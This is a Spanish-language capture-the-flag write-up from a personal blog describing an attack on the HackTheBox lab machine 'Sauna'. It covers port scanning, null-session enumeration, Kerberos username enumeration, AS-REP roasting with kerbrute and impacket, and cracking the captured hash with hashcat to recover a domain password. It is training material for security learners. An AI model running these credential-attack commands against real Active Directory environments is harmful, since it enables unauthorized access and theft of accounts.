<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>HTB sauna AD - Bast1ant1c</title>
<meta name="description" content="Vamos a resolver la máquina sauna AD de HackTheBox. ¡Let’s hack!">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Bast1ant1c">
<meta property="og:title" content="HTB sauna AD">
<meta property="og:url" content="http://localhost:4000/sauna/">


  <meta property="og:description" content="Vamos a resolver la máquina sauna AD de HackTheBox. ¡Let’s hack!">



  <meta property="og:image" content="http://localhost:4000/assets/images/sauna/01-inicio.png">





  <meta property="article:published_time" content="2023-02-15T00:00:00-05:00">





  

  


<link rel="canonical" href="http://localhost:4000/sauna/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "Bast1ant1c",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Bast1ant1c Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Blog</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscar</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">HTB sauna AD</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name"></h3>
    
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="HTB sauna AD">
    <meta itemprop="description" content="Vamos a resolver la máquina sauna AD de HackTheBox. ¡Let’s hack!">
    <meta itemprop="datePublished" content="February 15, 2023">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">HTB sauna AD
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-02-15T00:00:00-05:00">February 15, 2023 </time>&emsp;
          
          
        </p>
        <p align="center">
<img src="/assets/images/sauna/02-tarjeta.png" />
</p>

<p>¡Hola!
En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">sauna</code> AD de <a href="https://hackthebox.com/">HackTheBox</a>.
La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>

<h2 id="preparación">PREPARACIÓN</h2>

<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">sauna</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack sauna 
<span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
</code></pre></div></div>

<h2 id="reconocimiento">RECONOCIMIENTO</h2>

<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>osping 10.10.10.175
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> Detectando sistema operativo ...

<span class="o">[</span>+] 10.10.10.175 <span class="nv">ttl</span><span class="o">=</span>127 <span class="o">&gt;&gt;</span> Windows
</code></pre></div></div>

<p>Identificamos que es una maquina <strong>Windows</strong> debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).</p>

<ul>
  <li>TTL =&gt; 64	Linux</li>
  <li>TTL =&gt; 128	Windows</li>
</ul>

<p>Continuamos con la enumeración de los <strong>65535</strong> puertos en la máquina.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.175 <span class="nt">-oG</span> ports | <span class="nb">grep </span>open
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49689/tcp open  unknown
49696/tcp open  unknown
</code></pre></div></div>

<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49689,49696 <span class="nt">-sCV</span> <span class="nt">-Pn</span> 10.10.10.175 <span class="nt">-oN</span> versions
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-01-25 06:44:49Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</code></pre></div></div>

<h2 id="ad-domain-detection">AD DOMAIN DETECTION</h2>

<p>Iniciamos con la detección del <code class="language-plaintext highlighter-rouge">dominio</code> donde inicialmente, por medio de la utilidad <code class="language-plaintext highlighter-rouge">crackmapexec</code> enumeramos información necesaria para tener un mejor alcance a la máquina víctima.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.175
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.175    445    SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<p>Agregamos en el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
nvim /etc/hosts
10.10.10.175  SAUNA SAUNA.EGOTISTICAL-BANK.LOCAL EGOTISTICAL-BANK.LOCAL
</code></pre></div></div>

<h2 id="smb-null-session-enum">SMB NULL SESSION ENUM</h2>

<p>Eumeramos información por smb null session</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.175 <span class="nt">--shares</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.175    445    SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED<span class="o">(</span>The remote user session has been deleted.<span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> 10.10.10.175 <span class="nt">-N</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
SMB1 disabled <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'null
</span></code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[!]</span> Authentication error on 10.10.10.175
</code></pre></div></div>

<h2 id="rpcclient-null-session-enum">RPCCLIENT NULL SESSION ENUM</h2>

<p>Eumeramos información por rpcclient null session</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">''</span> 10.10.10.175 <span class="nt">-N</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> enumdomusers
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>result was NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<h2 id="ldapsearch-null-session-enum">LDAPSEARCH NULL SESSION ENUM</h2>

<p>Eumeramos información por ldapsearch null session</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.10.175 <span class="nt">-s</span> base namingcontext
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># extended LDIF</span>
<span class="c">#</span>
<span class="c"># LDAPv3</span>
<span class="c"># base &lt;&gt; (default) with scope baseObject</span>
<span class="c"># filter: (objectclass=*)</span>
<span class="c"># requesting: namingcontext </span>
<span class="c">#</span>

<span class="c">#</span>
dn:

<span class="c"># search result</span>
search: 2
result: 0 Success

<span class="c"># numResponses: 2</span>
<span class="c"># numEntries: 1</span>
</code></pre></div></div>

<p>En este punto hemos realizado diferentes enumeraciones sin exito, ahora con <code class="language-plaintext highlighter-rouge">ldapsearch</code>, junto con el dominio <code class="language-plaintext highlighter-rouge">EGOTISTICAL-BANK.LOCAL</code>, profundizamos en la enumeración, obteniendo un potencial usuario.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.10.175 <span class="nt">-b</span> <span class="s1">'DC=EGOTISTICAL-BANK,DC=LOCAL'</span> | <span class="nb">grep</span> <span class="s1">'dn: CN='</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dn: <span class="nv">CN</span><span class="o">=</span>Users,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
dn: <span class="nv">CN</span><span class="o">=</span>Computers,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
dn: <span class="nv">CN</span><span class="o">=</span>System,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
dn: <span class="nv">CN</span><span class="o">=</span>LostAndFound,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
dn: <span class="nv">CN</span><span class="o">=</span>Infrastructure,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
dn: <span class="nv">CN</span><span class="o">=</span>ForeignSecurityPrincipals,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
dn: <span class="nv">CN</span><span class="o">=</span>Program Data,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
dn: <span class="nv">CN</span><span class="o">=</span>NTDS Quotas,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
dn: <span class="nv">CN</span><span class="o">=</span>Managed Service Accounts,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
dn: <span class="nv">CN</span><span class="o">=</span>Keys,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
dn: <span class="nv">CN</span><span class="o">=</span>TPM Devices,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
dn: <span class="nv">CN</span><span class="o">=</span>Builtin,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
dn: <span class="nv">CN</span><span class="o">=</span>Hugo Smith,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCA
</code></pre></div></div>

<h2 id="users-dictionary">USERS DICTIONARY</h2>

<p>El usuario <strong>hugo smith</strong> puede ser potencial para encontrar un usuario valido en el AD, por lo que vamos a probar una serie de combinaciones para lograr obtener un usuario.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nvim users.txt
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hsmith
hugo.smith
hugosmith
hugos
</code></pre></div></div>

<h1 id="tgt-kerbrute-enum">TGT KERBRUTE ENUM</h1>

<p>Procedemos a validar nuestra lista de usuarios para identificar un nuevo usuario</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerbrute userenum <span class="nt">-d</span> EGOTISTICAL-BANK.LOCAL <span class="nt">--dc</span> 10.10.10.175 users.txt
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        

Version: dev <span class="o">(</span>n/a<span class="o">)</span> - 01/24/23 - Ronnie Flathers @ropnop

2023/01/24 18:59:44 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2023/01/24 18:59:44 <span class="o">&gt;</span>  	10.10.10.175:88

2023/01/24 18:59:44 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	hsmith@EGOTISTICAL-BANK.LOCAL
2023/01/24 18:59:44 <span class="o">&gt;</span>  Done! Tested 5 usernames <span class="o">(</span>1 valid<span class="o">)</span> <span class="k">in </span>0.278 seconds
</code></pre></div></div>

<h2 id="tgt-getnpusers-enum">TGT GETNPUSERS ENUM</h2>

<p>Obtenemos que <code class="language-plaintext highlighter-rouge">hsmith</code> es un usuario valido! Ahora vamos a realizar la misma validación con la herramienta <code class="language-plaintext highlighter-rouge">GetNPUsers</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
<span class="o">[</span>-] User hsmith doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
</span></code></pre></div></div>

<h2 id="users-dictionary-web-enum">USERS DICTIONARY (WEB ENUM)</h2>

<p>Ahora que tenemos usuarios, procedemos a realizar la enumeración de información a nivel web, encontrando en la sección <code class="language-plaintext highlighter-rouge">about</code> potenciales usuarios.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="s2">"http://10.10.10.175/about.html"</span> | <span class="nb">grep</span> <span class="s1">'&lt;p class="mt-2"&gt;'</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'&gt;'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'&lt;'</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nvim users.txt
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hsmith
fsmith
hbear
skerb
scoins
btaylor
sdriver
</code></pre></div></div>

<h2 id="tgt-kerbrute-enum-new-userstxt">TGT KERBRUTE ENUM (NEW USERS.TXT)</h2>

<p>Con el nuevo archivo <code class="language-plaintext highlighter-rouge">users.txt</code> realizamos la misma validación de usuarios con <code class="language-plaintext highlighter-rouge">kerbrute</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerbrute userenum <span class="nt">-d</span> EGOTISTICAL-BANK.LOCAL <span class="nt">--dc</span> 10.10.10.175 users.txt
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        

Version: dev <span class="o">(</span>n/a<span class="o">)</span> - 01/24/23 - Ronnie Flathers @ropnop

2023/01/24 19:15:33 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2023/01/24 19:15:33 <span class="o">&gt;</span>  	10.10.10.175:88

2023/01/24 19:15:34 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	hsmith@EGOTISTICAL-BANK.LOCAL
2023/01/24 19:15:34 <span class="o">&gt;</span>  <span class="o">[</span>+] fsmith has no pre auth required. Dumping <span class="nb">hash </span>to crack offline:
<span class="nv">$krb5asrep$18$fsmith</span>@EGOTISTICAL-BANK.LOCAL:23d86689a7c1f297c7ef70d470d32f7d<span class="nv">$f0eb11ef9f3535f80c8bb9e807c1d379ede1025dc9cf902482ed4946b44cc4002d579a708b9676dacc1fc7a24bde98aa38ff43d9c338619c3d36f6a0b2a4012b5879720be047d3a1350879b0c5bc3705c3956ff32efe26db38167ea4fe1f8efcd8ec71e4d51119b4b6c88e18454eb31204bb319b03121932b0241fec746debafc2109ea95a695ca08784bebfe1e858a0f5c3fc30b0236130ac93cb5a84d7d5f29c6d97f1fc49d896d1f5258f7cbd83e9e73072ebea4e8e041263711d8d5e70da0f7378397ab46c0abd4b547dd928306c2b67ee9134e70ea1bf4fe119688a8cbe93c9a7806841359f48c1dd6130b057c01c29a0bc2d22e85db78bd49e4f8afb516dfe52f5b6a2f687b4df665f9aeae89d2154717a0960</span>
2023/01/24 19:15:34 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	fsmith@EGOTISTICAL-BANK.LOCAL
2023/01/24 19:15:34 <span class="o">&gt;</span>  Done! Tested 7 usernames <span class="o">(</span>2 valid<span class="o">)</span> <span class="k">in </span>0.273 seconds
</code></pre></div></div>

<h2 id="tgt-getnpusers-enum-new-userstxt">TGT GETNPUSERS ENUM (NEW USERS.TXT)</h2>

<p>Procedemos con el mismo ejercicio con la herramienta <code class="language-plaintext highlighter-rouge">GetNPUsers</code> y como podemos ver ya encontramos el hash krb5 que podemos crackear para obtener la contraseña de un usuario del AD.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span>-] User hsmith doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:c753449e67f9983145b8ca9f57efabfc$fb9f945439826b8aea11a83711e9aa2f5eae6c0815aa0b937961cf227378c0bc9dfdd081485797f2942432e581eb1687a87c2631ab398848225e7d25b58116285e9939019f76b7492c6e03445a5901848ccdc40607d257062cec34e5b09e0aaefcea476b6ab929bf55692097b6daa598e2dd1b7fb7c05ce18a115ce3e7a7c9ec316ec280656d5b6ddf1ce4a0fab4e5d5a93d8bb95158ddead5524c800a50f224d433c8a1668d42616d72c428d7154f2204f0a61397b8e139d9359631f7339468f581056ff0a891c769a6d125a4af64f5af40093b00e82863785aaf98237116a9028a6f3bb8cb49944e464bc7da7516f0a0b7880b7021d4e25f7cd98733a5d3af
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
</span></code></pre></div></div>

<h2 id="cracking-kerberos-hash">CRACKING KERBEROS HASH</h2>

<p>Ahora que tenemos el hash capturado, vamos a almacenarlo en el archivo <code class="language-plaintext highlighter-rouge">hash</code> y crackearlo con <code class="language-plaintext highlighter-rouge">hashcat</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:c753449e67f9983145b8ca9f57efabfc$fb9f945439826b8aea11a83711e9aa2f5eae6c0815aa0b937961cf227378c0bc9dfdd081485797f2942432e581eb1687a87c2631ab398848225e7d25b58116285e9939019f76b7492c6e03445a5901848ccdc40607d257062cec34e5b09e0aaefcea476b6ab929bf55692097b6daa598e2dd1b7fb7c05ce18a115ce3e7a7c9ec316ec280656d5b6ddf1ce4a0fab4e5d5a93d8bb95158ddead5524c800a50f224d433c8a1668d42616d72c428d7154f2204f0a61397b8e139d9359631f7339468f581056ff0a891c769a6d125a4af64f5af40093b00e82863785aaf98237116a9028a6f3bb8cb49944e464bc7da7516f0a0b7880b7021d4e25f7cd98733a5d3af'</span> <span class="o">&gt;</span> <span class="nb">hash</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 18200 <span class="nt">-a</span> 0 <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$krb5asrep$23$fsmith</span>@EGOTISTICAL-BANK.LOCAL:c753449e67f9983145b8ca9f57efabfc<span class="nv">$fb9f945439826b8aea11a83711e9aa2f5eae6c0815aa0b937961cf227378c0bc9dfdd081485797f2942432e581eb1687a87c2631ab398848225e7d25b58116285e9939019f76b7492c6e03445a5901848ccdc40607d257062cec34e5b09e0aaefcea476b6ab929bf55692097b6daa598e2dd1b7fb7c05ce18a115ce3e7a7c9ec316ec280656d5b6ddf1ce4a0fab4e5d5a93d8bb95158ddead5524c800a50f224d433c8a1668d42616d72c428d7154f2204f0a61397b8e139d9359631f7339468f581056ff0a891c769a6d125a4af64f5af40093b00e82863785aaf98237116a9028a6f3bb8cb49944e464bc7da7516f0a0b7880b7021d4e25f7cd98733a5d3af</span>:Thestrokes23
</code></pre></div></div>

<h2 id="granted-access-fsmith-user">GRANTED ACCESS FSMITH USER</h2>

<p>Ahora tenemos lo necesario para conectarnos remotamente en caso de tener credenciales validas previamente detectadas por <code class="language-plaintext highlighter-rouge">crackmapexec</code> por medio de la utilidad <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.175    445    SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>+] EGOTISTICAL-BANK.LOCAL<span class="se">\f</span>smith:Thestrokes23 
